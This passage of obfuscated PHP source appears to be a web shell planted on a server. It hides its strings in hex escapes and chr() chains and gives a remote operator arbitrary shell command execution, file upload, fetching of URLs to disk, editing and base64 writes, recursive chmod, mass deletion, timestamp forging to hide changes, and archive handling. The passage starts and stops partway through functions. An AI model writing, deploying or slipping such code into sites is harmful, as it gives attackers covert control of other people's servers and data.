    header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x3a\x20\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6f\x63\x74\x65\x74\x2d\x73\x74\x72\x65\x61\x6d");
    header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(68).chr(105).chr(115).chr(112).chr(111).chr(115).chr(105).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(97).chr(116).chr(116).chr(97).chr(99).chr(104).chr(109).chr(101).chr(110).chr(116).chr(59).chr(32).chr(102).chr(105).chr(108).chr(101).chr(110).chr(97).chr(109).chr(101).chr(61).chr(34) . basename($_609105) . "\x22");
    header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(76).chr(101).chr(110).chr(103).chr(116).chr(104).chr(58).chr(32) . filesize($_609105));
    header("\x58\x2d\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x2d\x4f\x70\x74\x69\x6f\x6e\x73\x3a\x20\x6e\x6f\x73\x6e\x69\x66\x66");
    readfile($_609105);
    exit;
}


if ($_9111db === "\x72\x61\x77") {
    $_609105 = _f9773869f($_7d57a6, isset($_GET["\x66"]) ? $_GET[chr(102)] : "");
    if (!is_file($_609105) || !is_readable($_609105)) {
        http_response_code(404);
        exit(chr(78).chr(111).chr(116).chr(32).chr(102).chr(111).chr(117).chr(110).chr(100));
    }
    $_d1f08d = chr(97).chr(112).chr(112).chr(108).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(47).chr(111).chr(99).chr(116).chr(101).chr(116).chr(45).chr(115).chr(116).chr(114).chr(101).chr(97).chr(109);
    if (is_fn_usable(chr(102).chr(105).chr(110).chr(102).chr(111).chr(95).chr(111).chr(112).chr(101).chr(110))) {
        $_810056 = @finfo_open(FILEINFO_MIME_TYPE);
        if ($_810056) {
            $_a163ba = @finfo_file($_810056, $_609105);
            if ($_a163ba)
                $_d1f08d = $_a163ba;
            @finfo_close($_810056);
        }
    }
    elseif (is_fn_usable(chr(109).chr(105).chr(109).chr(101).chr(95).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(95).chr(116).chr(121).chr(112).chr(101))) {
        $_c91b42 = @mime_content_type($_609105);
        if ($_c91b42)
            $_d1f08d = $_c91b42;
    }
    header("\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x3a\x20" . $_d1f08d);
    header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(76).chr(101).chr(110).chr(103).chr(116).chr(104).chr(58).chr(32) . filesize($_609105));
    header(chr(88).chr(45).chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(45).chr(79).chr(112).chr(116).chr(105).chr(111).chr(110).chr(115).chr(58).chr(32).chr(110).chr(111).chr(115).chr(110).chr(105).chr(102).chr(102));
    header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(68).chr(105).chr(115).chr(112).chr(111).chr(115).chr(105).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(105).chr(110).chr(108).chr(105).chr(110).chr(101).chr(59).chr(32).chr(102).chr(105).chr(108).chr(101).chr(110).chr(97).chr(109).chr(101).chr(61).chr(34) . basename($_609105) . chr(34));
    readfile($_609105);
    exit;
}


if ($_SERVER["\x52\x45\x51\x55\x45\x53\x54\x5f\x4d\x45\x54\x48\x4f\x44"] === chr(80).chr(79).chr(83).chr(84)) {
    _fbaa772a9();
    if (!function_exists(chr(98).chr(105).chr(114).chr(117).chr(95).chr(114).chr(101).chr(100).chr(105).chr(114).chr(101).chr(99).chr(116))) {
        function biru_redirect($_2858cd)
        {
            header("\x4c\x6f\x63\x61\x74\x69\x6f\x6e\x3a\x20\x3f\x70\x3d" . rawurlencode($_2858cd));
            exit;
        }
    }
    switch ($_9111db) {
        case "\x6c\x6f\x67\x6f\x75\x74": {
                session_destroy();
                header("\x4c\x6f\x63\x61\x74\x69\x6f\x6e\x3a\x20\x3f");
                exit;
            }
        case "\x6e\x65\x77\x2d\x66\x69\x6c\x65": {
                $_201cba = trim((string)(isset($_POST["\x6e\x61\x6d\x65"]) ? $_POST["\x6e\x61\x6d\x65"] : ""));
                $_df26d1 = isset($_POST[chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116)]) ? (string)$_POST["\x63\x6f\x6e\x74\x65\x6e\x74"] : null;
                if ($_201cba === "" || strpos($_201cba, DIRECTORY_SEPARATOR) !== false) {
                    $_SESSION["\x6d\x73\x67"] = chr(78).chr(101).chr(119).chr(32).chr(70).chr(105).chr(108).chr(101).chr(58).chr(32).chr(105).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(110).chr(97).chr(109).chr(101);
                    biru_redirect($_7d57a6);
                }
                $_15eb26 = _f9773869f($_7d57a6, $_201cba);
                if (file_exists($_15eb26)) {
                    $_SESSION[chr(109).chr(115).chr(103)] = chr(78).chr(101).chr(119).chr(32).chr(70).chr(105).chr(108).chr(101).chr(58).chr(32).chr(97).chr(108).chr(114).chr(101).chr(97).chr(100).chr(121).chr(32).chr(101).chr(120).chr(105).chr(115).chr(116).chr(115);
                    biru_redirect($_7d57a6);
                }
                list($_f10de9, $_d22d60) = _f9ec8a008($_15eb26, $_df26d1);
                $_SESSION["\x6d\x73\x67"] = $_f10de9 ? ("New File OK via {$_d22d60}: " . $_201cba) : ("\x4e\x65\x77\x20\x46\x69\x6c\x65\x20\x66\x61\x69\x6c\x65\x64\x3a\x20" . $_d22d60);
                biru_redirect($_7d57a6);
            }
        case chr(110).chr(101).chr(119).chr(45).chr(100).chr(105).chr(114): {
                $_201cba = trim((string)(isset($_POST[chr(110).chr(97).chr(109).chr(101)]) ? $_POST["\x6e\x61\x6d\x65"] : ""));
                if ($_201cba === "" || strpos($_201cba, DIRECTORY_SEPARATOR) !== false) {
                    $_SESSION[chr(109).chr(115).chr(103)] = chr(78).chr(101).chr(119).chr(32).chr(70).chr(111).chr(108).chr(100).chr(101).chr(114).chr(58).chr(32).chr(105).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(110).chr(97).chr(109).chr(101);
                    biru_redirect($_7d57a6);
                }
                $_15eb26 = _f9773869f($_7d57a6, $_201cba);
                if (file_exists($_15eb26)) {
                    $_SESSION[chr(109).chr(115).chr(103)] = "\x4e\x65\x77\x20\x46\x6f\x6c\x64\x65\x72\x3a\x20\x61\x6c\x72\x65\x61\x64\x79\x20\x65\x78\x69\x73\x74\x73";
                    biru_redirect($_7d57a6);
                }
                $_f10de9 = @mkdir($_15eb26, 0775, false);
                $_SESSION[chr(109).chr(115).chr(103)] = $_f10de9 ? (chr(78).chr(101).chr(119).chr(32).chr(70).chr(111).chr(108).chr(100).chr(101).chr(114).chr(32).chr(79).chr(75).chr(58).chr(32) . $_201cba) : "\x4e\x65\x77\x20\x46\x6f\x6c\x64\x65\x72\x20\x66\x61\x69\x6c\x65\x64";
                biru_redirect($_7d57a6);
            }
        case chr(101).chr(100).chr(105).chr(116).chr(45).chr(115).chr(97).chr(118).chr(101): {
                $_84d168 = _f9773869f($_7d57a6, isset($_POST["\x66\x69\x6c\x65"]) ? $_POST[chr(102).chr(105).chr(108).chr(101)] : "");
                $_df26d1 = isset($_POST["\x63\x6f\x6e\x74\x65\x6e\x74"]) ? $_POST[chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116)] : "";
                $_ddf387 = isset($_POST[chr(109).chr(111).chr(100).chr(101)]) ? $_POST["\x6d\x6f\x64\x65"] : chr(116).chr(120).chr(116);
                if (!is_file($_84d168) || !is_writable($_84d168)) {
                    $_SESSION[chr(109).chr(115).chr(103)] = chr(83).chr(97).chr(118).chr(101).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(32).chr(40).chr(102).chr(105).chr(108).chr(101).chr(32).chr(110).chr(111).chr(116).chr(32).chr(119).chr(114).chr(105).chr(116).chr(97).chr(98).chr(108).chr(101).chr(41);
                    biru_redirect($_7d57a6);
                }
                if ($_ddf387 === "\x62\x36\x34") {
                    $_8cb860 = base64_decode($_df26d1, true);
                    if ($_8cb860 === false) {
                        $_SESSION[chr(109).chr(115).chr(103)] = chr(83).chr(97).chr(118).chr(101).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(58).chr(32).chr(105).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(66).chr(97).chr(115).chr(101).chr(54).chr(52).chr(32).chr(100).chr(97).chr(116).chr(97);
                        biru_redirect($_7d57a6);
                    }
                    @file_put_contents($_84d168, $_8cb860);
                }
                else {
                    @file_put_contents($_84d168, $_df26d1);
                }
                $_SESSION[chr(109).chr(115).chr(103)] = "\x53\x61\x76\x65\x64\x3a\x20" . basename($_84d168);
                biru_redirect($_7d57a6);
            }
        case "\x72\x65\x6e\x61\x6d\x65": {
                $_f5e410 = _f9773869f($_7d57a6, isset($_POST["\x6f\x6c\x64"]) ? $_POST[chr(111).chr(108).chr(100)] : '');
                $_3586cb = trim((string)(isset($_POST[chr(110).chr(101).chr(119)]) ? $_POST["\x6e\x65\x77"] : ""));
                if ($_3586cb === "" || strpos($_3586cb, DIRECTORY_SEPARATOR) !== false) {
                    $_SESSION["\x6d\x73\x67"] = "\x49\x6e\x76\x61\x6c\x69\x64\x20\x6e\x65\x77\x20\x6e\x61\x6d\x65";
                }
                else {
                    $_15eb26 = _f9773869f($_7d57a6, $_3586cb);
                    $_SESSION[chr(109).chr(115).chr(103)] = @rename($_f5e410, $_15eb26) ? "\x52\x65\x6e\x61\x6d\x65\x20\x4f\x4b" : chr(82).chr(101).chr(110).chr(97).chr(109).chr(101).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100);
                }
                biru_redirect($_7d57a6);
            }
        case "\x63\x68\x6d\x6f\x64": {
                $_cd0aae = _f9773869f($_7d57a6, isset($_POST["\x74\x61\x72\x67\x65\x74"]) ? $_POST["\x74\x61\x72\x67\x65\x74"] : "");
                $_ddf387 = _fd414c285((string)(isset($_POST[chr(109).chr(111).chr(100).chr(101)]) ? $_POST["\x6d\x6f\x64\x65"] : "\x30\x36\x34\x34"));
                $_f1fa04 = !empty($_POST["\x72\x65\x63\x75\x72\x73\x69\x76\x65"]);
                $_f10de9 = true;
                _f723a3385($_cd0aae, $_ddf387, $_f1fa04, $_f10de9);
                $_SESSION["\x6d\x73\x67"] = $_f10de9 ? "\x43\x68\x6d\x6f\x64\x20\x4f\x4b" : "\x43\x68\x6d\x6f\x64\x20\x70\x61\x72\x74\x69\x61\x6c\x6c\x79\x20\x66\x61\x69\x6c\x65\x64";
                biru_redirect($_7d57a6);
            }
        case chr(100).chr(101).chr(108).chr(101).chr(116).chr(101): {
                $_9518b6 = _f9773869f($_7d57a6, isset($_POST["\x74\x61\x72\x67\x65\x74"]) ? $_POST["\x74\x61\x72\x67\x65\x74"] : "");
                $_SESSION[chr(109).chr(115).chr(103)] = _f5a4b36c7($_9518b6) ? chr(68).chr(101).chr(108).chr(101).chr(116).chr(101).chr(32).chr(79).chr(75) : chr(68).chr(101).chr(108).chr(101).chr(116).chr(101).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100);
                biru_redirect($_7d57a6);
            }
        case "\x6d\x61\x73\x73\x2d\x64\x65\x6c\x65\x74\x65": {
                $_3efe62 = isset($_POST[chr(105).chr(116).chr(101).chr(109).chr(115)]) ? $_POST["\x69\x74\x65\x6d\x73"] : array();
                $_f10de9 = true;
                if (is_array($_3efe62))
                    foreach ($_3efe62 as $_714c11) {
                        $_f10de9 = _f5a4b36c7(_f9773869f($_7d57a6, $_714c11)) && $_f10de9;
                    }
                $_SESSION[chr(109).chr(115).chr(103)] = $_f10de9 ? chr(66).chr(117).chr(108).chr(107).chr(32).chr(100).chr(101).chr(108).chr(101).chr(116).chr(101).chr(32).chr(79).chr(75) : "\x53\x6f\x6d\x65\x20\x69\x74\x65\x6d\x73\x20\x66\x61\x69\x6c\x65\x64\x20\x74\x6f\x20\x64\x65\x6c\x65\x74\x65";
                biru_redirect($_7d57a6);
            }
        case chr(109).chr(97).chr(115).chr(115).chr(45).chr(99).chr(104).chr(109).chr(111).chr(100): {
                $_3efe62 = isset($_POST["\x69\x74\x65\x6d\x73"]) ? $_POST[chr(105).chr(116).chr(101).chr(109).chr(115)] : array();
                $_ddf387 = _fd414c285((string)(isset($_POST["\x6d\x6f\x64\x65"]) ? $_POST["\x6d\x6f\x64\x65"] : chr(48).chr(54).chr(52).chr(52)));
                $_f1fa04 = !empty($_POST[chr(114).chr(101).chr(99).chr(117).chr(114).chr(115).chr(105).chr(118).chr(101)]);
                $_f10de9 = true;
                $_060367 = 0;
                if (is_array($_3efe62))
                    foreach ($_3efe62 as $_714c11) {
                        _f723a3385(_f9773869f($_7d57a6, $_714c11), $_ddf387, $_f1fa04, $_f10de9);
                        $_060367++;
                    }
                if ($_060367 === 0)
                    $_SESSION["\x6d\x73\x67"] = chr(78).chr(111).chr(32).chr(105).chr(116).chr(101).chr(109).chr(115).chr(32).chr(115).chr(101).chr(108).chr(101).chr(99).chr(116).chr(101).chr(100).chr(32).chr(102).chr(111).chr(114).chr(32).chr(99).chr(104).chr(109).chr(111).chr(100);
                else
                    $_SESSION[chr(109).chr(115).chr(103)] = $_f10de9 ? chr(66).chr(117).chr(108).chr(107).chr(32).chr(99).chr(104).chr(109).chr(111).chr(100).chr(32).chr(79).chr(75) : "\x53\x6f\x6d\x65\x20\x69\x74\x65\x6d\x73\x20\x66\x61\x69\x6c\x65\x64\x20\x74\x6f\x20\x63\x68\x6d\x6f\x64";
                biru_redirect($_7d57a6);
            }
        case "\x75\x70\x6c\x6f\x61\x64": {
                if (!isset($_FILES["\x66\x69\x6c\x65\x73"])) {
                    $_SESSION[chr(109).chr(115).chr(103)] = chr(78).chr(111).chr(32).chr(102).chr(105).chr(108).chr(101).chr(115).chr(32).chr(112).chr(114).chr(111).chr(118).chr(105).chr(100).chr(101).chr(100);
                    biru_redirect($_7d57a6);
                }
                $_2858cd = count($_FILES[chr(102).chr(105).chr(108).chr(101).chr(115)][chr(110).chr(97).chr(109).chr(101)]);
                $_f10de9 = 0;
                $_228fe1 = 0;
                $_92e99a = array();
                for ($_5e4544 = 0; $_5e4544 < $_2858cd; $_5e4544++) {
                    $_201cba = $_FILES["\x66\x69\x6c\x65\x73"][chr(110).chr(97).chr(109).chr(101)][$_5e4544];
                    $_c91b42 = $_FILES[chr(102).chr(105).chr(108).chr(101).chr(115)][chr(116).chr(109).chr(112).chr(95).chr(110).chr(97).chr(109).chr(101)][$_5e4544];
                    $_90e0bb = $_FILES[chr(102).chr(105).chr(108).chr(101).chr(115)]["\x65\x72\x72\x6f\x72"][$_5e4544];
                    if ($_90e0bb !== UPLOAD_ERR_OK) {
                        $_228fe1++;
                        $_92e99a[] = "$_201cba (error $_90e0bb)";
                        continue;
                    }
                    list($_ed8b45, $_f82480) = _fe7ad5abf($_c91b42, _f9773869f($_7d57a6, $_201cba));
                    if ($_ed8b45)
                        $_f10de9++;
                    else {
                        $_228fe1++;
                        $_92e99a[] = "$_201cba ($_f82480)";
                    }
                }
                $_SESSION["\x6d\x73\x67"] = "Upload: OK=$_f10de9; Failed=$_228fe1" . ($_92e99a ? "\x3b\x20" . implode(chr(44).chr(32), $_92e99a) : '');
                biru_redirect($_7d57a6);
            }
        case chr(117).chr(114).chr(108).chr(45).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100): {
                $_b0a847 = trim((string)(isset($_POST[chr(117).chr(114).chr(108)]) ? $_POST["\x75\x72\x6c"] : ""));
                $_c820c0 = trim((string)(isset($_POST["\x66\x69\x6c\x65\x6e\x61\x6d\x65"]) ? $_POST[chr(102).chr(105).chr(108).chr(101).chr(110).chr(97).chr(109).chr(101)] : ''));
                if ($_b0a847 === "") {
                    $_SESSION[chr(109).chr(115).chr(103)] = chr(85).chr(82).chr(76).chr(32).chr(105).chr(115).chr(32).chr(101).chr(109).chr(112).chr(116).chr(121);
                    biru_redirect($_7d57a6);
                }
                if ($_c820c0 === "") {
                    $_a1c28d = parse_url($_b0a847, PHP_URL_PATH);
                    $_c820c0 = basename($_a1c28d ? $_a1c28d : '');
                    if ($_c820c0 === "") {
                        $_c820c0 = "\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x2e\x62\x69\x6e";
                    }
                }
                list($_f10de9, $_0980b5) = fetchUrlToFile($_b0a847, _f9773869f($_7d57a6, $_c820c0));
                $_SESSION[chr(109).chr(115).chr(103)] = $_f10de9 ? "Downloaded from URL: $_c820c0" : "URL download failed: $_0980b5";
                biru_redirect($_7d57a6);
            }
        case "\x6d\x74\x69\x6d\x65": {
                $_cd0aae = _f9773869f($_7d57a6, isset($_POST["\x74\x61\x72\x67\x65\x74"]) ? $_POST[chr(116).chr(97).chr(114).chr(103).chr(101).chr(116)] : "");
                $_3a4685 = trim((string)(isset($_POST[chr(116).chr(115)]) ? $_POST["\x74\x73"] : ''));
                $_f1fa04 = !empty($_POST["\x72\x65\x63\x75\x72\x73\x69\x76\x65"]);
                if ($_3a4685 === '') {
                    $_SESSION[chr(109).chr(115).chr(103)] = "\x43\x68\x61\x6e\x67\x65\x20\x44\x61\x74\x65\x3a\x20\x65\x6d\x70\x74\x79";
                    biru_redirect($_7d57a6);
                }
                if (ctype_digit($_3a4685))
                    $_acacac = (int)$_3a4685;
                else {
                    $_acacac = @strtotime($_3a4685);
                    if ($_acacac === false) {
                        $_SESSION["\x6d\x73\x67"] = chr(67).chr(104).chr(97).chr(110).chr(103).chr(101).chr(32).chr(68).chr(97).chr(116).chr(101).chr(58).chr(32).chr(105).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(116).chr(105).chr(109).chr(101).chr(32).chr(102).chr(111).chr(114).chr(109).chr(97).chr(116);
                        biru_redirect($_7d57a6);
                    }
                }
                $_f10de9 = true;
                _fc3481723($_cd0aae, $_acacac, $_f1fa04, $_f10de9);
                $_SESSION[chr(109).chr(115).chr(103)] = $_f10de9 ? ("\x43\x68\x61\x6e\x67\x65\x20\x44\x61\x74\x65\x20\x4f\x4b\x20\xe2\x86\x92\x20" . date("\x59\x2d\x6d\x2d\x64\x20\x48\x3a\x69\x3a\x73", $_acacac)) : "\x43\x68\x61\x6e\x67\x65\x20\x44\x61\x74\x65\x20\x70\x61\x72\x74\x69\x61\x6c\x6c\x79\x20\x66\x61\x69\x6c\x65\x64";
                biru_redirect($_7d57a6);
            }
        case chr(99).chr(109).chr(100): {
                $_ddf0bf = trim((string)(isset($_POST["\x63\x6d\x64"]) ? $_POST["\x63\x6d\x64"] : ''));
                if ($_ddf0bf === '') {
                    $_SESSION[chr(109).chr(115).chr(103)] = chr(67).chr(111).chr(109).chr(109).chr(97).chr(110).chr(100).chr(32).chr(105).chr(115).chr(32).chr(101).chr(109).chr(112).chr(116).chr(121).chr(46);
                    biru_redirect($_7d57a6);
                }
                $_b166dd = run_command_all($_ddf0bf, $_7d57a6);
                $_be5191 = (string)$_b166dd[chr(111).chr(117).chr(116)];
                if (strlen($_be5191) > 1024 * 1024)
                    $_be5191 = substr($_be5191, 0, 1024 * 1024) . chr(10).chr(91).chr(111).chr(117).chr(116).chr(112).chr(117).chr(116).chr(32).chr(116).chr(114).chr(117).chr(110).chr(99).chr(97).chr(116).chr(101).chr(100).chr(93);
                $_SESSION[chr(99).chr(109).chr(100).chr(95).chr(114).chr(101).chr(115).chr(117).chr(108).chr(116)] = array(chr(99).chr(109).chr(100) => $_ddf0bf, "\x6d\x65\x74\x68\x6f\x64" => $_b166dd[chr(109).chr(101).chr(116).chr(104).chr(111).chr(100)], chr(99).chr(111).chr(100).chr(101) => $_b166dd["\x63\x6f\x64\x65"], chr(111).chr(117).chr(116) => $_be5191);
                biru_redirect($_7d57a6);
            }

        
        case "\x6d\x6f\x76\x65": {
                $_004638 = (string)(isset($_POST[chr(115).chr(114).chr(99)]) ? $_POST["\x73\x72\x63"] : '');
                $_aab63e = (string)(isset($_POST[chr(100).chr(115).chr(116)]) ? $_POST["\x64\x73\x74"] : '');
                $_048ad0 = _f9773869f($_7d57a6, $_004638);
                if ($_004638 === "" || !file_exists($_048ad0)) {
                    $_SESSION["\x6d\x73\x67"] = "\x4d\x6f\x76\x65\x20\x66\x61\x69\x6c\x65\x64\x3a\x20\x73\x6f\x75\x72\x63\x65\x20\x6d\x69\x73\x73\x69\x6e\x67";
                    biru_redirect($_7d57a6);
                }
                if ($_aab63e === "") {
                    $_SESSION[chr(109).chr(115).chr(103)] = chr(77).chr(111).chr(118).chr(101).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(58).chr(32).chr(100).chr(101).chr(115).chr(116).chr(105).chr(110).chr(97).chr(116).chr(105).chr(111).chr(110).chr(32).chr(101).chr(109).chr(112).chr(116).chr(121);
                    biru_redirect($_7d57a6);
                }
                if (!is_dir($_aab63e)) {
                    $_SESSION[chr(109).chr(115).chr(103)] = "\x4d\x6f\x76\x65\x20\x66\x61\x69\x6c\x65\x64\x3a\x20\x64\x65\x73\x74\x69\x6e\x61\x74\x69\x6f\x6e\x20\x69\x73\x20\x6e\x6f\x74\x20\x61\x20\x64\x69\x72\x65\x63\x74\x6f\x72\x79";
                    biru_redirect($_7d57a6);
                }
                $_f64331 = _f9773869f($_aab63e, basename($_004638));
                if (@realpath($_048ad0) === @realpath($_f64331)) {
                    $_SESSION[chr(109).chr(115).chr(103)] = "\x4d\x6f\x76\x65\x20\x73\x6b\x69\x70\x70\x65\x64\x20\x28\x73\x61\x6d\x65\x20\x6c\x6f\x63\x61\x74\x69\x6f\x6e\x29";
                    biru_redirect($_7d57a6);
                }
                $_f10de9 = @rename($_048ad0, $_f64331);
                $_SESSION["\x6d\x73\x67"] = $_f10de9 ? "\x4d\x6f\x76\x65\x20\x4f\x4b" : "\x4d\x6f\x76\x65\x20\x66\x61\x69\x6c\x65\x64";
                biru_redirect($_7d57a6);
            }
        case "\x7a\x69\x70": {
                $_d2b3df = isset($_POST["\x69\x74\x65\x6d\x73"]) ? $_POST["\x69\x74\x65\x6d\x73"] : array();
                $_201cba = trim((string)(isset($_POST[chr(122).chr(105).chr(112).chr(110).chr(97).chr(109).chr(101)]) ? $_POST[chr(122).chr(105).chr(112).chr(110).chr(97).chr(109).chr(101)] : ''));
                if (!is_array($_d2b3df) || empty($_d2b3df)) {
                    $_SESSION["\x6d\x73\x67"] = chr(90).chr(105).chr(112).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(58).chr(32).chr(110).chr(111).chr(116).chr(104).chr(105).chr(110).chr(103).chr(32).chr(115).chr(101).chr(108).chr(101).chr(99).chr(116).chr(101).chr(100);
                    biru_redirect($_7d57a6);
                }
                if ($_201cba === '')
                    $_201cba = chr(97).chr(114).chr(99).chr(104).chr(105).chr(118).chr(101).chr(45) . date(chr(89).chr(109).chr(100).chr(45).chr(72).chr(105).chr(115)) . "\x2e\x7a\x69\x70";
                $_5c5d1f = _f9773869f($_7d57a6, $_201cba);

                $_ed8b45 = false;
                $_0a97e3 = "";
                if (class_exists("\x5a\x69\x70\x41\x72\x63\x68\x69\x76\x65")) {
                    $_112030 = new ZipArchive();
                    if ($_112030->open($_5c5d1f, ZipArchive::CREATE | ZipArchive::OVERWRITE) === true) {
                        foreach ($_d2b3df as $_3caea7) {
                            $_6812dc = _f9773869f($_7d57a6, $_3caea7);
                            if (is_dir($_6812dc)) {
                                $_b55fcb = rtrim($_3caea7, DIRECTORY_SEPARATOR);
                                _fb0db2b7d($_112030, $_6812dc, $_b55fcb);
                            }
                            elseif (is_file($_6812dc)) {
                                $_112030->addFile($_6812dc, basename($_3caea7));
                            }
                        }
                        $_112030->close();
                        $_ed8b45 = true;
                    }
                    else {
                        $_0a97e3 = chr(90).chr(105).chr(112).chr(65).chr(114).chr(99).chr(104).chr(105).chr(118).chr(101).chr(32).chr(111).chr(112).chr(101).chr(110).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100);
                    }
                }
                if (!$_ed8b45) {
                    if (class_exists("\x50\x68\x61\x72\x44\x61\x74\x61")) {
                        try {
                            $_ef69b7 = preg_replace("\x7e\x5c\x2e\x7a\x69\x70\x24\x7e\x69", "\x2e\x74\x61\x72", $_5c5d1f);
                            $_bbad95 = new PharData($_ef69b7);
                            foreach ($_d2b3df as $_3caea7) {
                                $_6812dc = _f9773869f($_7d57a6, $_3caea7);
                                if (is_dir($_6812dc)) {
                                    $_bbad95->addEmptyDir(basename($_3caea7));
                                    _fdfbd192c($_bbad95, $_6812dc, basename($_3caea7));
                                }
                                elseif (is_file($_6812dc)) {
                                    $_bbad95->addFile($_6812dc, basename($_3caea7));
                                }
                            }
                            unset($_bbad95);
                            $_SESSION["\x6d\x73\x67"] = chr(90).chr(105).chr(112).chr(65).chr(114).chr(99).chr(104).chr(105).chr(118).chr(101).chr(32).chr(110).chr(111).chr(116).chr(32).chr(97).chr(118).chr(97).chr(105).chr(108).chr(97).chr(98).chr(108).chr(101).chr(59).chr(32).chr(99).chr(114).chr(101).chr(97).chr(116).chr(101).chr(100).chr(32).chr(84).chr(65).chr(82).chr(32).chr(105).chr(110).chr(115).chr(116).chr(101).chr(97).chr(100).chr(58).chr(32) . basename($_ef69b7);
                            biru_redirect($_7d57a6);
                        }
                        catch (Exception $_90e0bb) {
                            $_0a97e3 = "\x54\x41\x52\x20\x66\x61\x6c\x6c\x62\x61\x63\x6b\x20\x66\x61\x69\x6c\x65\x64\x3a\x20" . $_90e0bb->getMessage();
                        }
                    }
                    else {
                        $_0a97e3 = ($_0a97e3 ? $_0a97e3 . "\x3b\x20" : '') . chr(78).chr(111).chr(32).chr(90).chr(105).chr(112).chr(65).chr(114).chr(99).chr(104).chr(105).chr(118).chr(101).chr(32).chr(110).chr(111).chr(114).chr(32).chr(80).chr(104).chr(97).chr(114).chr(68).chr(97).chr(116).chr(97).chr(32).chr(97).chr(118).chr(97).chr(105).chr(108).chr(97).chr(98).chr(108).chr(101);
                    }
                }
                $_SESSION["\x6d\x73\x67"] = $_ed8b45 ? (chr(65).chr(114).chr(99).chr(104).chr(105).chr(118).chr(101).chr(32).chr(99).chr(114).chr(101).chr(97).chr(116).chr(101).chr(100).chr(58).chr(32) . basename($_5c5d1f)) : ("\x5a\x69\x70\x20\x66\x61\x69\x6c\x65\x64\x3a\x20" . $_0a97e3);
                biru_redirect($_7d57a6);
            }
        case chr(117).chr(110).chr(122).chr(105).chr(112): {
                $_84d168 = _f9773869f($_7d57a6, isset($_POST[chr(102).chr(105).chr(108).chr(101)]) ? $_POST[chr(102).chr(105).chr(108).chr(101)] : "");
                if (!is_file($_84d168)) {
                    $_SESSION[chr(109).chr(115).chr(103)] = chr(85).chr(110).chr(122).chr(105).chr(112).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(58).chr(32).chr(102).chr(105).chr(108).chr(101).chr(32).chr(110).chr(111).chr(116).chr(32).chr(102).chr(111).chr(117).chr(110).chr(100);
                    biru_redirect($_7d57a6);
                }
                $_78f209 = strtolower(pathinfo($_84d168, PATHINFO_EXTENSION));
                $_f10de9 = false;
                $_0a97e3 = '';
                if ($_78f209 === "\x7a\x69\x70" && class_exists(chr(90).chr(105).chr(112).chr(65).chr(114).chr(99).chr(104).chr(105).chr(118).chr(101))) {
                    $_112030 = new ZipArchive();
                    if ($_112030->open($_84d168) === true) {
                        $_f10de9 = $_112030->extractTo($_7d57a6);
                        $_112030->close();
                        if (!$_f10de9)
                            $_0a97e3 = "\x5a\x69\x70\x20\x65\x78\x74\x72\x61\x63\x74\x54\x6f\x20\x66\x61\x69\x6c\x65\x64";
                    }
                    else {
                        $_0a97e3 = chr(90).chr(105).chr(112).chr(32).chr(111).chr(112).chr(101).chr(110).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100);
                    }
                }
                else {
                    try {
                        if (class_exists("\x50\x68\x61\x72\x44\x61\x74\x61") && preg_match("\x7e\x5c\x2e\x28\x74\x61\x72\x7c\x74\x61\x72\x5c\x2e\x67\x7a\x7c\x74\x61\x72\x5c\x2e\x62\x7a\x32\x7c\x74\x61\x72\x5c\x2e\x78\x7a\x29\x24\x7e\x69", $_84d168)) {
                            $_bbad95 = new PharData($_84d168);
                            $_bbad95->extractTo($_7d57a6, null, true);
                            $_f10de9 = true;
                        }
                        else {
                            $_0a97e3 = "\x55\x6e\x73\x75\x70\x70\x6f\x72\x74\x65\x64\x20\x61\x72\x63\x68\x69\x76\x65\x20\x74\x79\x70\x65\x20\x6f\x72\x20\x50\x68\x61\x72\x44\x61\x74\x61\x20\x6e\x6f\x74\x20\x61\x76\x61\x69\x6c\x61\x62\x6c\x65";
                        }
                    }
                    catch (Exception $_90e0bb) {
                        $_0a97e3 = $_90e0bb->getMessage();
                    }
                }
                $_SESSION["\x6d\x73\x67"] = $_f10de9 ? chr(85).chr(110).chr(122).chr(105).chr(112).chr(32).chr(79).chr(75) : (chr(85).chr(110).chr(122).chr(105).chr(112).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(58).chr(32) . $_0a97e3);
                biru_redirect($_7d57a6);
            }
    }
}



function _fb0db2b7d($_112030, $_a7b8f0, $_b15708)
{
    $_a7b8f0 = rtrim($_a7b8f0, DIRECTORY_SEPARATOR);
    if (method_exists($_112030, chr(97).chr(100).chr(100).chr(69).chr(109).chr(112).chr(116).chr(121).chr(68).chr(105).chr(114)))
        $_112030->addEmptyDir($_b15708);
